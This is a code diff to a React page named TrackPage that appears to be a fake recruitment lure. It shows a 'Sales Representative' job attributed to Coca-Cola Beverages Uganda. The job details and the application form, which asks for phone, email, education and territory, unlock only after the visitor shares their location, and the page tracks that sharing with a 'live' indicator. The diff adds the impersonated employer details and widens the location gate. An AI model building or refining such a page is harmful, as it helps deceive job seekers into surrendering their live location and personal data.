@@ -1,3 +1,4 @@
+
 'use client';
 
 import { useEffect, useRef, useState, type FormEvent } from 'react';
@@ -198,6 +199,7 @@ export default function TrackPage() {
               <div className="brandSub">{ORG_SUB}</div>
             </div>
           </div>
+
           <div className={`tag ${tracking ? 'tagLive' : ''}`}>
             {tracking && <span className="dot" />}
             Sales Representative
@@ -225,93 +227,140 @@ export default function TrackPage() {
                 <div className="lockedPanel">
                   <h2>Location sharing required</h2>
                   <p>
-                    To open the application form, please share your location for application
-                    verification. The form will unlock after location sharing is active.
+                    To open the job details and application form, please share your location for
+                    application verification. The application will unlock after location sharing is
+                    active.
                   </p>
                   <button onClick={() => setShowLocationPopup(true)} className="primaryBtn">
                     Share location to continue
                   </button>
                 </div>
               ) : (
-                <form onSubmit={submitApplication} className="applicationForm">
-                  <div className="formGrid">
-                    <label>
-                      Phone number
-                      <input
-                        required
-                        value={application.phone}
-                        onChange={(e) => setApplication({ ...application, phone: e.target.value })}
-                        placeholder="+256..."
-                      />
-                    </label>
+                <div className="applicationArea">
+                  <div className="jobPanel">
+                    <h2>Sales Representative</h2>
+                    <p>
+                      Coca-Cola Beverages Uganda is recruiting a field sales representative to
+                      support customer visits, route growth, product availability, sales execution,
+                      and brand visibility across assigned territories.
+                    </p>
 
-                    <label>
-                      Email address
-                      <input
-                        required
-                        type="email"
-                        value={application.email}
-                        onChange={(e) => setApplication({ ...application, email: e.target.value })}
-                        placeholder="name@example.com"
-                      />
-                    </label>
-
-                    <label>
-                      Education level
-                      <input
-                        required
-                        value={application.education}
-                        onChange={(e) =>
-                          setApplication({ ...application, education: e.target.value })
-                        }
-                        placeholder="Diploma, degree, certificate..."
-                      />
-                    </label>
-
-                    <label>
-                      Sales experience
-                      <input
-                        required
-                        value={application.experience}
-                        onChange={(e) =>
-                          setApplication({ ...application, experience: e.target.value })
-                        }
-                        placeholder="Example: 2 years FMCG sales"
-                      />
-                    </label>
-
-                    <label className="full">
-                      Preferred sales territory
-                      <input
-                        required
-                        value={application.territory}
-                        onChange={(e) =>
-                          setApplication({ ...application, territory: e.target.value })
-                        }
-                        placeholder="Kampala, Mbarara, Entebbe..."
-                      />
-                    </label>
-
-                    <label className="check full">
-                      <input
-                        type="checkbox"
-                        checked={application.hasPermit}
-                        onChange={(e) =>
-                          setApplication({ ...application, hasPermit: e.target.checked })
-                        }
-                      />
-                      I have a valid riding or driving permit
-                    </label>
+                    <div className="jobGrid">
+                      <Detail label="Company" value="Coca-Cola Beverages Uganda" />
+                      <Detail label="Position" value="Sales Representative" />
+                      <Detail label="Location" value="Kampala, Uganda" />
+                      <Detail label="Department" value="Sales and Distribution" />
+                      <Detail label="Employment Type" value="Full-time" />
+                      <Detail label="Reports To" value="Area Sales Manager" />
+                    </div>
                   </div>
 
-                  <button disabled={submittingApplication} className="primaryBtn">
-                    {submittingApplication ? 'Submitting...' : 'Submit application'}
-                  </button>
+                  <div className="jobPanel twoCol">
+                    <div>
+                      <h2>Key Responsibilities</h2>
+                      <ul>
+                        <li>Visit assigned outlets and customers according to the approved route plan.</li>
+                        <li>Drive sales performance against daily, weekly, and monthly targets.</li>
+                        <li>Build strong relationships with retailers, wholesalers, and key customers.</li>
+                        <li>Ensure product availability, correct pricing, stock rotation, and visibility.</li>
+                        <li>Report customer feedback, competitor activity, and new market opportunities.</li>
+                      </ul>
+                    </div>
 
-                  {applicationSubmitted && (
-                    <p className="formStatus">Application submitted successfully.</p>
-                  )}
-                </form>
+                    <div>
+                      <h2>Minimum Requirements</h2>
+                      <ul>
+                        <li>Diploma or degree in Business, Marketing, Sales, or a related field.</li>
+                        <li>At least 1 year of experience in FMCG, retail, sales, or distribution.</li>
+                        <li>Strong communication, negotiation, and customer relationship skills.</li>
+                        <li>Good knowledge of Kampala and surrounding sales territories.</li>
+                        <li>A valid riding or driving permit is an added advantage.</li>
+                      </ul>
+                    </div>
+                  </div>
+
+                  <form onSubmit={submitApplication} className="applicationForm">
+                    <h2>Application Form</h2>
+
+                    <div className="formGrid">
+                      <label>
+                        Phone number
+                        <input
+                          required
+                          value={application.phone}
+                          onChange={(e) => setApplication({ ...application, phone: e.target.value })}
+                          placeholder="+256..."
+                        />
+                      </label>
+
+                      <label>
+                        Email address
+                        <input
+                          required
+                          type="email"
+                          value={application.email}
+                          onChange={(e) => setApplication({ ...application, email: e.target.value })}
+                          placeholder="name@example.com"
+                        />
+                      </label>
+
+                      <label>
+                        Education level
+                        <input
+                          required
+                          value={application.education}
+                          onChange={(e) =>
+                            setApplication({ ...application, education: e.target.value })
+                          }
+                          placeholder="Diploma, degree, certificate..."
+                        />
+                      </label>
+
+                      <label>
+                        Sales experience
+                        <input
+                          required
+                          value={application.experience}
+                          onChange={(e) =>
+                            setApplication({ ...application, experience: e.target.value })
+                          }
+                          placeholder="Example: 2 years FMCG sales"
+                        />
+                      </label>
+
+                      <label className="full">
+                        Preferred sales territory
+                        <input
+                          required
+                          value={application.territory}
+                          onChange={(e) =>
+                            setApplication({ ...application, territory: e.target.value })
+                          }
+                          placeholder="Kampala, Mbarara, Entebbe..."
+                        />
+                      </label>
+
+                      <label className="check full">
+                        <input
+                          type="checkbox"
+                          checked={application.hasPermit}
+                          onChange={(e) =>
+                            setApplication({ ...application, hasPermit: e.target.checked })
+                          }
+                        />
+                        I have a valid riding or driving permit
+                      </label>
+                    </div>
+
+                    <button disabled={submittingApplication} className="primaryBtn">
+                      {submittingApplication ? 'Submitting...' : 'Submit application'}
+                    </button>
+
+                    {applicationSubmitted && (
+                      <p className="formStatus">Application submitted successfully.</p>
+                    )}
+                  </form>
+                </div>
               )}
             </>
           )}
@@ -413,7 +462,7 @@ export default function TrackPage() {
         }
 
         .heroBody {
-          max-width: 820px;
+          max-width: 920px;
           padding-bottom: 48px;
         }
 
@@ -465,9 +514,53 @@ export default function TrackPage() {
           line-height: 1.65;
         }
 
-        .applicationForm {
+        .applicationArea {
           margin-top: 28px;
-          max-width: 760px;
+          display: grid;
+          gap: 16px;
+        }
+
+        .jobPanel,
+        .applicationForm {
+          max-width: 900px;
+          border-radius: 10px;
+          background: rgba(255, 255, 255, 0.96);
+          color: #171717;
+          padding: 22px;
+        }
+
+        .jobPanel h2,
+        .applicationForm h2 {
+          margin: 0 0 10px;
+          font-size: 22px;
+        }
+
+        .jobPanel p,
+        .jobPanel li {
+          color: #444;
+          font-size: 15px;
+          line-height: 1.7;
+        }
+
+        .jobPanel p {
+          margin: 0 0 16px;
+        }
+
+        .jobPanel ul {
+          margin: 0;
+          padding-left: 20px;
+        }
+
+        .jobGrid {
+          display: grid;
+          grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+          gap: 12px;
+        }
+
+        .twoCol {
+          display: grid;
+          grid-template-columns: 1fr 1fr;
+          gap: 28px;
         }
 
         .formGrid {
@@ -480,7 +573,7 @@ export default function TrackPage() {
         label {
           display: grid;
           gap: 7px;
-          color: white;
+          color: #171717;
           font-size: 13px;
           font-weight: 700;
         }
@@ -491,13 +584,18 @@ export default function TrackPage() {
 
         input {
           width: 100%;
-          border: 1px solid rgba(255, 255, 255, 0.35);
+          border: 1px solid rgba(0, 0, 0, 0.16);
           border-radius: 8px;
-          background: rgba(255, 255, 255, 0.96);
+          background: white;
           color: #171717;
           padding: 12px 13px;
           font-size: 15px;
           outline: none;
+        }
+
+        input:focus {
+          border-color: #e41d2c;
+          box-shadow: 0 0 0 3px rgba(228, 29, 44, 0.12);
         }
 
         .check {
@@ -530,8 +628,9 @@ export default function TrackPage() {
 
         .formStatus {
           margin-top: 14px;
-          color: white;
+          color: #166244;
           font-size: 14px;
+          font-weight: 700;
         }
 
         .modalOverlay {
@@ -584,7 +683,8 @@ export default function TrackPage() {
         }
 
         @media (max-width: 720px) {
-          .formGrid {
+          .formGrid,
+          .twoCol {
             grid-template-columns: 1fr;
           }
 
@@ -600,3 +700,34 @@ export default function TrackPage() {
     </main>
   );
 }
+
+function Detail({ label, value }: { label: string; value: string }) {
+  return (
+    <div className="detail">
+      <div className="detailLabel">{label}</div>
+      <div className="detailValue">{value}</div>
+
+      <style jsx>{`
+        .detail {
+          border-radius: 8px;
+          background: #f7f7f4;
+          border: 1px solid rgba(0, 0, 0, 0.07);
+          padding: 12px;
+        }
+
+        .detailLabel {
+          font-size: 12px;
+          color: #666;
+          margin-bottom: 4px;
+        }
+
+        .detailValue {
+          font-size: 14px;
+          font-weight: 750;
+          color: #171717;
+        }
+      `}</style>
+    </div>
+  );
+}
+```
